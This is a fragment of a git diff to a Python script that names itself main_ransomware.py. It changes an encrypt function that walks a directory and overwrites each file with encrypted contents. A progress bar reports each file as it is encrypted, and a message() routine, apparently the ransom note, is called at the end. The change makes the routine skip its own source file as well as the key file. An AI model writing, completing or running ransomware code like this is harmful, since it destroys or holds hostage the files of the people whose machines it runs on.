@@ -41,7 +41,7 @@ def encrypt(dir):
     for file_id in range(len(content)):
         file_name = dir + "/" +content[file_id]
 
-        if content[file_id] == "key.key":
+        if content[file_id] == "key.key" or content[file_id] == "main_ransomware.py":
             continue
 
         with open(content[file_id], 'wb') as encrypted_file:
@@ -51,7 +51,7 @@ def encrypt(dir):
             encrypted_file.write(encrypted_text) 
 
         advancment = (100 * (file_id + 1)) / len(content)
-        print(f"[{file_id + 1}/{len(content)}]" + "[" + "#" * int(advancment / 10) + " " * (10 - int(advancment / 10)) + "]" , f"{advancment}%" , f"Encrypting {file_name}...", end="\r")
+        print(f"[{file_id + 1}/{len(content)}]" + "[" + "#" * int(advancment / 10) + " " * (10 - int(advancment / 10)) + "]" , f"{advancment}%", f"Encrypting {file_name}...", end="\r")
 
     print("\n")
     message()
